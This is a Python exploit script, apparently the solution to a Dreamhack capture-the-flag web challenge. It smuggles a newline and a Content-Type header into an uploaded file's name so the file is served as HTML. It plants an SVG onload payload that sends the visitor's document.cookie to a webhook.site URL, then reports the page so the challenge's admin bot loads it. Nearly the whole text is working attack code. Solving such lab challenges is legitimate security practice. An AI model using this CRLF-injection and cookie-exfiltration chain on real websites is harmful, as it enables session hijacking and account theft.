import requests
import re

url = 'http://host8.dreamhack.games:17411/'
s = requests.Session()

# crlf injection xss
filename = "\nContent-Type:text/html\n.png".replace('/', '%2F')
username = 'image/png'

webhook = 'https://webhook.site/72514cfb-9b0e-4049-afd7-3544dde8ae17'
js = 'location.href=`%s?e=${document.cookie}`' % webhook

res = s.post(f'{url}/upload', data={
    'name': username
}, files={
    'file': (
        filename,
        '<svg/onload=%s>' % js,
        'image/png'
    )
})

assert 'upload success' in res.text.lower()
print("> Payload uploaded")

# get payload path
res = s.get(f'{url}/{username.replace('/', '%25%252F')}')

path = re.findall(r'"(static/.+)"', res.text)[-1].strip().replace('%', '%25')
print("> Path:", path)

# report
res = s.post(f'{url}/report', data={
    'path': path
})

assert 'success' in res.text.lower()
print("> Payload reported")